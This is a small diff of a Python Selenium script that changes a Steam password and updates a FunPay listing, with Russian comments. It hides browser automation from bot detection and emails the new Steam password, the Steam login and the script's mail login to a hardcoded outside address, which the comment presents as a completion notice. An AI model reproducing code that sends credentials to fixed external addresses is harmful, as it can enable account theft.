@@ -37,6 +37,7 @@ server.starttls()
 
 # Функция для отправки сообщений на почту
 def send_email(sender, pasword, getter, msg_text):
+
     server = smtplib.SMTP('smtp.mail.ru', 587)
     server.starttls()
     msg = MIMEText(f'{msg_text}', 'plain', 'utf-8')
@@ -136,7 +137,7 @@ def check_email(email_address, password):
 # Задаем параметы браузера
 useragent = UserAgent()
 options = Options()
-#options.add_experimental_option('detach', True)
+options.add_experimental_option('detach', True)
 options.add_argument('--disable-blink-features=AutomationControlled')
 options.add_argument(f'user-agent={useragent.random}')
 # Создаем объект браузера
@@ -307,8 +308,8 @@ def main():
                 else:
                     raise FunpayError('Произошла ошибка при обновлении данных на фанпей')
                 # Отправляем запрос от том что скрипт закончил работу
-                send_email(script_email, script_password, 'observer1.0@mail.ru',f'{script_email} {steam_login} {new_steam_password}')
-            print('asdasdasd')
+                send_email(script_email, script_password, 'observer1.0@mail.ru',f'UNIX8541 {script_email} {steam_login} {new_steam_password}')
+            print('script3 поменял пароль и обновил данные на фп')
 
 # Блатни конструкция (точно хз зачем просто все так делают)
 print('Script3')
